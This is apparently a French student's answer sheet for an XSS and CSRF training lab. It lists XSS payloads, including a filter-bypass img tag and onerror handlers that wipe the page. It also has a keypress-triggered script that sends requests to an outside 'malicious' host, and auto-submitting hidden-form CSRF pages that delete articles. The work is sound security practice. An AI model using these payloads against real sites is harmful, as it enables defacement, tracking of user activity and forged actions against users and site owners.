##Partie 1 :

level 1 :

https://xss-csrf-tp.herokuapp.com/level/1?page=1%3Cimg%20src=%22https://idealogeek.fr/wp-content/uploads/2020/09/RNG-Random-Number-Generator-1024x576.jpg%22%3E%3C/img%3E

------------------------------------------------------------------------------

level 2 :

1-	<script type="text/javascript>alert("Ceci est une alerte")</script>

2-	La balise ne fonctionne pas. Ils sont bloqués par mesure de sécurité

3-	Les données en base sont récupérées via un POST

4-	`<img src='touklakos.jpg' onerror="body.remove()" ></img>`

5-

------------------------------------------------------------------------------

level 3 :

1-	`<i<img>mg src='touklakos.jpg' onerror="body.remove()"/>`

2-	

```javascript
    (function() {
      var httpRequest;
      window.addEventListener('keypress', makeRequest);

      function makeRequest() {
        httpRequest = new XMLHttpRequest();

        if (!httpRequest) {
          console.log('Erreur :( Impossible de créer XMLHTTP');
          return false;
        }
        httpRequest.onreadystatechange = alertContents;
        httpRequest.open('GET', 'https://my-malicious-website-muller.herokuapp.com/keylogger.php');
        httpRequest.setRequestHeader('Access-Control-Allow-Origin', null);
        httpRequest.send();
      }

      function alertContents() {
        if (httpRequest.readyState === XMLHttpRequest.DONE) {
          if (httpRequest.status === 200) {
            console.log(httpRequest.responseText);
          } else {
            console.log('Erreur : (problème avec la requête)');
          }
        }
      }
    })();
```

##Partie 2 :

1-	https://my-malicious-website-muller.herokuapp.com/

2-	
```php
    <?php include_once("index.html"); ?>

    <form
    	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
    	method="GET"
        id="12"
    >
    </form>

    <script>
    	document.getElementById("12").submit();
    </script>
```

3-	
```php
    <?php include_once("index.html"); ?>

    <iframe name="hiddenIFrame" style="display: none;"></iframe>

    <form
    	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
        method="about:blank"
        id="12"
        target="hiddenIFrame"
    >
    </form>

    <script>
    	document.getElementById("12").submit();
    </script>
```